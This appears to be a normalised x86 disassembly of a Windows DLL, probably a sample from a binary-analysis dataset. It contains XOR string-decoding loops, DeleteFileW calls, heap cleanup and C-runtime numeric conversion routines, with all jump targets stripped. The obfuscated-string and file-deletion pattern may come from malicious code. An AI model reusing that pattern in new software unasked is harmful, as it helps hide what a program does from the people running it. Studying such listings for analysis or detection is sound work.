lea edx [ esp + 0x1a4 ]
lea eax [ edi + 0x59 ]
mov [ esp + 0x20 ] edi
mov [ esp + 0x44 ] edi
call sub_10045930
mov eax edx
push eax
lea ecx [ esp + 0xcc ]
lea ebx [ esi + 0xc ]
push ecx
mov [ esp + 0x24 ] ebx
call sub_10017cc0
add esp 0x8
mov edx eax
lea ecx [ edi + 0xc ]
mov [ esp + 0x410 ] 0x2
call sub_100205a0
cmp [ esp + 0xdc ] 0x8
jb r-xdata
mov ecx [ esp + 0x408 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x3f0 ]
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0xa4 ]
sub ecx [ esi + 0xa0 ]
xor eax eax
sar ecx 0x3
xor ebx ebx
mov [ esp + 0xdc ] 0x7
mov [ esp + 0xd8 ] edi
mov [ esp + 0xc8 ] ax
test ecx ecx
jne r-xdata
mov edx [ esp + 0xc8 ]
push edx
call sub_100187af
add esp 0x4
xor eax eax
xor edx edx
mov [ esp + 0xb8 ] 0x7
mov [ esp + 0xb4 ] edi
mov [ esp + 0xa4 ] dx
mov [ esp + 0xc0 ] eax
mov [ esp + 0xc4 ] eax
mov [ esp + 0x410 ] 0x3
mov eax [ r--data ]
movsx ecx [ eax ]
xor ecx 0x4e
and ecx 0xff
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x18 ] cx
mov ecx eax
push ecx
mov [ esp + 0x1e ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x1
push 0x1
push eax
lea eax [ esp + 0x20c ]
call sub_10066ff0
test eax eax
jne r-xdata
mov ecx esi
lea eax [ esp + 0x34 ]
lea esi [ esp + 0x4c ]
call sub_10055ba0
lea edx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x4c ]
mov eax esi
push eax
lea ecx [ esp + 0x4c ]
lea edi [ esp + 0x2c ]
mov [ esp + 0x418 ] 0x4
call sub_10046560
test eax eax
je r-xdata
cmp [ esp + 0xb8 ] 0x8
jb r-xdata
lea eax [ esp + 0x1f4 ]
lea edx [ eax + 0x2 ]
mov eax [ esp + 0x44 ]
cmp eax 0x1e84800
jge r-xdata
mov ecx [ r--data ]
xor eax eax
lea ebx [ ebx ]
mov esi [ esp + 0x24 ]
xor ecx ecx
mov [ esp + 0xb8 ] 0x7
mov [ esp + 0xb4 ] edi
mov [ esp + 0xa4 ] cx
cmp esi edi
je r-xdata
mov eax [ esp + 0xa4 ]
push eax
call sub_100187af
add esp 0x4
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ esp + 0x1f8 ]
push ecx
lea ecx [ esp + 0xac ]
call sub_1005ddc0
mov eax [ esi + 0xa0 ]
mov edx [ eax + ebx * 8 ]
mov [ esp + 0xc0 ] edx
mov eax [ eax + ebx * 8 + 0x4 ]
lea ecx [ esp + 0xa4 ]
lea edi [ esp + 0x24 ]
mov [ esp + 0xc4 ] eax
call sub_10048ba0
lea ecx [ esp + 0xa4 ]
lea edi [ esp + 0x34 ]
call sub_10068f40
cmp [ esp + 0xb8 ] 0x8
jb r-xdata
lea edx [ esp + 0x14 ]
mov eax 0x46
call sub_10045930
mov ecx edx
push ecx
mov ecx [ rw-data ]
push edx
mov eax edx
push eax
push 0x1
push 0x1
push ecx
lea eax [ esp + 0x20c ]
mov [ esp + 0x30 ] 0x1
call sub_10066ff0
test eax eax
jne r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ rw-data ]
push 0x0
push eax
push ecx
push edx
xor edx edx
xor ecx ecx
call sub_1005c3d0
mov esi eax
test esi esi
je r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x7f
and edx 0xff
mov [ esp + eax * 2 + 0x12c ] dx
inc eax
cmp eax 0x39
jb r-xdata
mov ebx [ esp + 0x1c ]
lea ecx [ esp + 0x12c ]
push ecx
lea edx [ esp + 0xe8 ]
xor eax eax
push edx
mov [ esp + 0x1a6 ] ax
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0xc
mov [ esp + 0x410 ] 0x5
call sub_100205a0
cmp [ esp + 0xf8 ] 0x8
jb r-xdata
mov esi [ esp + 0x34 ]
cmp esi edi
je r-xdata
mov edi [ esp + 0x28 ]
mov eax esi
call sub_100699f0
push esi
call sub_100187af
add esp 0x4
xor edi edi
mov edx [ esi + 0xa4 ]
sub edx [ esi + 0xa0 ]
inc ebx
sar edx 0x3
cmp ebx edx
jb r-xdata
mov ecx [ esp + 0xa4 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ esp + 0x20 ]
mov edi [ HeapFree@IAT ]
mov ebx [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x44 ]
mov eax [ esp + 0x20 ]
push edx
push eax
lea eax [ esp + 0x1fc ]
call sub_10005c30
add esp 0x8
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x20 ]
mov ebx [ HeapFree@IAT ]
mov edi [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x12c ]
mov eax 0x9
call sub_10045930
push esi
lea esi [ esp + 0xa8 ]
call sub_10045cc0
add esp 0x4
mov esi eax
mov ebx [ esp + 0x1c ]
lea eax [ esp + 0x12c ]
push eax
lea ecx [ esp + 0xe8 ]
push ecx
mov [ esp + 0x418 ] 0x6
call sub_10017cc0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0xc8 ]
mov [ esp + 0x410 ] 0x7
call sub_10057920
mov ebx 0x8
mov edx eax
lea ecx [ ebx + 0x4 ]
mov [ esp + 0x410 ] bl
call sub_100205a0
cmp [ esp + 0xdc ] ebx
jb r-xdata
lea eax [ esp + 0x4c ]
mov [ esp + 0x410 ] 0x1
call sub_1001f5f0
mov esi [ esp + 0x24 ]
test esi esi
je r-xdata
mov eax [ esp + 0xe4 ]
push eax
call sub_100187af
add esp 0x4
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x38 ]
push edx
lea eax [ esp + 0x44 ]
push eax
push ecx
push esi
call sub_10069cd0
push esi
call sub_100187af
add esp 0x14
xor edi edi
jmp r-xdata
mov esi [ esp + 0x24 ]
cmp esi [ esp + 0x28 ]
je r-xdata
push eax
push 0x0
call ebx
push eax
call edi
mov esi [ esp + 0x24 ]
cmp esi [ esp + 0x28 ]
je r-xdata
push eax
push 0x0
call edi
push eax
call ebx
xor esi esi
xor eax eax
mov edi 0x7
mov [ esp + 0xdc ] edi
mov [ esp + 0xd8 ] esi
mov [ esp + 0xc8 ] ax
cmp [ esp + 0xf8 ] ebx
jb r-xdata
mov edx [ esp + 0xc8 ]
push edx
call sub_100187af
add esp 0x4
mov esi [ esp + 0x34 ]
test esi esi
je r-xdata
mov edi [ esp + 0x28 ]
mov eax esi
call sub_100699f0
push esi
call sub_100187af
add esp 0x4
mov esi [ esp + 0x48 ]
mov edx [ esi + 0xa4 ]
mov ecx [ esi + 0xa0 ]
cmp ecx edx
je r-xdata
mov ecx [ esi + 0x1c ]
push ecx
push 0x0
call ebx
push eax
call edi
add esi 0x24
cmp esi [ esp + 0x28 ]
jne r-xdata
mov esi [ esp + 0x48 ]
mov edx [ esi + 0xa4 ]
mov ecx [ esi + 0xa0 ]
cmp ecx edx
je r-xdata
lea esp [ esp ]
xor edx edx
mov [ esp + 0xf8 ] edi
mov [ esp + 0xf4 ] esi
mov [ esp + 0xe4 ] dx
cmp [ esp + 0xb8 ] ebx
jb r-xdata
mov ecx [ esp + 0xe4 ]
push ecx
call sub_100187af
add esp 0x4
mov eax 0x2
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x38 ]
push ecx
lea edx [ esp + 0x44 ]
push edx
push eax
push esi
call sub_10069cd0
push esi
call sub_100187af
add esp 0x14
cmp [ esp + 0x18 ] 0x0
je r-xdata
mov eax edx
cmp edx edx
je r-xdata
mov ecx [ r--data ]
xor eax eax
mov eax edx
cmp edx edx
je r-xdata
mov ecx [ esi + 0x1c ]
push ecx
push 0x0
call edi
push eax
call ebx
add esi 0x24
cmp esi [ esp + 0x28 ]
jne r-xdata
lea eax [ esp + 0x4c ]
mov [ esp + 0x410 ] 0x1
call sub_1001f5f0
mov ebx [ esp + 0x24 ]
cmp ebx esi
je r-xdata
mov eax [ esp + 0xa4 ]
push eax
call sub_100187af
add esp 0x4
lea edx [ esp + 0x1f4 ]
push edx
call sub_1004cc40
mov esi eax
test esi esi
je r-xdata
mov ecx [ r--data ]
xor eax eax
lea ecx [ ecx ]
mov [ esi + 0xa4 ] ecx
mov edi [ eax ]
mov [ ecx ] edi
mov edi [ eax + 0x4 ]
mov [ ecx + 0x4 ] edi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffec
and edx 0xff
mov [ esp + eax * 2 + 0x100 ] dx
inc eax
cmp eax 0x14
jb r-xdata
mov ebx [ esp + 0x1c ]
lea ecx [ esp + 0x100 ]
push ecx
lea edx [ esp + 0xa8 ]
xor eax eax
push edx
mov [ esp + 0x130 ] ax
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0xc
mov [ esp + 0x410 ] 0x9
call sub_100205a0
cmp [ esp + 0xb8 ] 0x8
jb r-xdata
mov [ esi + 0xa4 ] ecx
mov edi edi
mov edi [ esp + 0x34 ]
cmp edi esi
je r-xdata
mov edi [ esp + 0x28 ]
mov eax ebx
call sub_100699f0
push ebx
call sub_100187af
add esp 0x4
lea edx [ esp + 0x1f4 ]
push edx
call [ DeleteFileW@IAT ]
lea edx [ esp + 0x100 ]
mov eax 0x3b
call sub_10045930
mov ebx [ esp + 0x1c ]
mov eax edx
push eax
lea ecx [ esp + 0xa8 ]
push ecx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0xc
mov [ esp + 0x410 ] 0x10
call sub_100205a0
cmp [ esp + 0xb8 ] 0x8
jb r-xdata
lea eax [ esp + 0x1f4 ]
push eax
call [ DeleteFileW@IAT ]
lea edx [ esp + 0x12c ]
mov eax 0x9
call sub_10045930
push esi
lea esi [ esp + 0xa8 ]
call sub_10045cc0
add esp 0x4
mov esi eax
mov ebx [ esp + 0x1c ]
lea ecx [ esp + 0x12c ]
push ecx
lea edx [ esp + 0xcc ]
push edx
mov [ esp + 0x418 ] 0xd
call sub_10017cc0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0xe4 ]
mov [ esp + 0x410 ] 0xe
call sub_10057920
mov edx eax
mov ecx 0xc
mov [ esp + 0x410 ] 0xf
call sub_100205a0
mov esi 0x8
cmp [ esp + 0xf8 ] esi
jb r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffd9
and edx 0xff
mov [ esp + eax * 2 + 0x12c ] dx
inc eax
cmp eax 0x3b
jb r-xdata
mov ecx [ esp + 0x18 ]
xor eax eax
push ecx
lea esi [ esp + 0xa8 ]
mov [ esp + 0x1a6 ] ax
call sub_10045cc0
add esp 0x4
mov esi eax
mov ebx [ esp + 0x1c ]
lea edx [ esp + 0x12c ]
push edx
lea eax [ esp + 0xcc ]
push eax
mov [ esp + 0x418 ] 0xa
call sub_10017cc0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0xe4 ]
mov [ esp + 0x410 ] 0xb
call sub_10057920
mov ecx 0xc
mov edx eax
mov [ esp + 0x410 ] cl
call sub_100205a0
cmp [ esp + 0xf8 ] 0x8
jb r-xdata
mov [ esp + 0x410 ] 0x1
mov eax [ esp + 0x4c ]
mov esi [ LocalFree@IAT ]
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esp + 0xa4 ]
push eax
jmp r-xdata
mov edi [ eax ]
mov [ ecx ] edi
mov edi [ eax + 0x4 ]
mov [ ecx + 0x4 ] edi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
mov eax 0x3
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x38 ]
push ecx
lea edx [ esp + 0x44 ]
push edx
push eax
push edi
call sub_10069cd0
push edi
call sub_100187af
add esp 0x14
mov edx [ esp + 0xa4 ]
push edx
xor ebx ebx
xor ecx ecx
mov edi 0x7
mov [ esp + 0xf8 ] edi
mov [ esp + 0xf4 ] ebx
mov [ esp + 0xe4 ] cx
cmp [ esp + 0xdc ] esi
jb r-xdata
mov eax [ esp + 0xe4 ]
push eax
call sub_100187af
add esp 0x4
xor ebx ebx
xor edx edx
mov edi 0x8
mov esi 0x7
mov [ esp + 0xf8 ] esi
mov [ esp + 0xf4 ] ebx
mov [ esp + 0xe4 ] dx
cmp [ esp + 0xdc ] edi
jb r-xdata
mov ecx [ esp + 0xe4 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ esp + 0x54 ]
cmp eax edi
je r-xdata
push eax
call esi
call sub_100187af
add esp 0x4
xor eax eax
mov [ esp + 0xdc ] edi
mov [ esp + 0xd8 ] ebx
mov [ esp + 0xc8 ] ax
cmp [ esp + 0xb8 ] esi
jb r-xdata
mov edx [ esp + 0xc8 ]
push edx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ esp + 0xdc ] esi
mov [ esp + 0xd8 ] ebx
mov [ esp + 0xc8 ] cx
cmp [ esp + 0xb8 ] edi
jb r-xdata
mov eax [ esp + 0xc8 ]
push eax
call sub_100187af
add esp 0x4
mov eax [ esp + 0x58 ]
cmp eax edi
je r-xdata
push eax
call esi
lea eax [ esp + 0x4c ]
mov [ esp + 0x410 ] 0x1
call sub_1001f5f0
mov esi [ esp + 0x24 ]
cmp esi ebx
je r-xdata
mov ecx [ esp + 0xa4 ]
push ecx
call sub_100187af
add esp 0x4
lea eax [ esp + 0x4c ]
mov [ esp + 0x410 ] 0x1
call sub_1001f5f0
mov ebx [ esp + 0x24 ]
test ebx ebx
je r-xdata
mov edx [ esp + 0xa4 ]
push edx
call sub_100187af
add esp 0x4
cmp [ esp + 0x5c ] edi
je r-xdata
push eax
call esi
mov esi [ esp + 0x34 ]
cmp esi ebx
je r-xdata
mov edi [ esp + 0x28 ]
mov eax esi
call sub_100699f0
push esi
call sub_100187af
add esp 0x4
mov esi [ esp + 0x34 ]
test esi esi
je r-xdata
mov edi [ esp + 0x28 ]
mov esi ebx
cmp ebx edi
je r-xdata
mov eax [ esp + 0x60 ]
cmp eax edi
je r-xdata
mov [ esp + 0x5c ] edi
mov eax 0x5
jmp r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x38 ]
push edx
lea eax [ esp + 0x44 ]
push eax
push ecx
push esi
call sub_10069cd0
push esi
call sub_100187af
add esp 0x14
mov eax 0x4
jmp r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x38 ]
push edx
lea eax [ esp + 0x44 ]
push eax
push ecx
push esi
call sub_10069cd0
push esi
call sub_100187af
add esp 0x14
push ebx
call sub_100187af
add esp 0x4
lea ebx [ ebx ]
mov eax [ esp + 0x64 ]
cmp eax edi
je r-xdata
push eax
call esi
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
mov eax [ esp + 0x68 ]
cmp eax edi
je r-xdata
push eax
call esi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esp + 0x9c ] edi
je r-xdata
push eax
call esi
cmp [ esp + 0xa0 ] edi
je r-xdata
mov [ esp + 0x9c ] edi
mov ebx [ esp + 0x24 ]
cmp ebx edi
je r-xdata
lea esi [ esp + 0xa0 ]
call sub_10005d80
mov ebx [ esp + 0x34 ]
test ebx ebx
je r-xdata
mov edi [ esp + 0x28 ]
mov esi ebx
cmp ebx edi
je r-xdata
xor eax eax
mov edi [ esp + 0x38 ]
mov esi ebx
cmp ebx edi
je r-xdata
push ebx
call sub_100187af
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push ebx
call sub_100187af
add esp 0x4
lea ecx [ ecx ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
add esi 0x1c
cmp esi edi
jne r-xdata
mov edx [ esi ]
push edx
call sub_100187af
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_1003227b
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1006c9ca
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
push esi
mov esi [ ebp - 0x4 ]
mov edx 0x76c
cmp esi edx
jl r-xdata
cmp esi 0x87
jle r-xdata
sub esi edx
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ eax + 0x14 ] esi
pop esi
or eax 0x2
mov [ ecx ] eax
sub_100322f0
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov [ ebp - 0x4 ] ecx
mov ecx [ eax ]
xor edi edi
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0x14 ] edi
jbe r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ebx [ ebp + 0x10 ]
mov edx [ ebp - 0x4 ]
add edx 0x8
push edx
lea eax [ ebp - 0x8 ]
push eax
mov ecx ebx
sub ecx esi
push ecx
lea edx [ ebp + 0x8 ]
push esi
push edx
call sub_10026eb0
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp [ ebp + 0x8 ] ax
jne r-xdata
inc edi
add esi eax
cmp edi [ ebp + 0x14 ]
jb r-xdata
xor eax eax
mov eax esi
lea edx [ eax + 0x1 ]
jmp r-xdata
cmp esi ebx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
sub_10032374
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
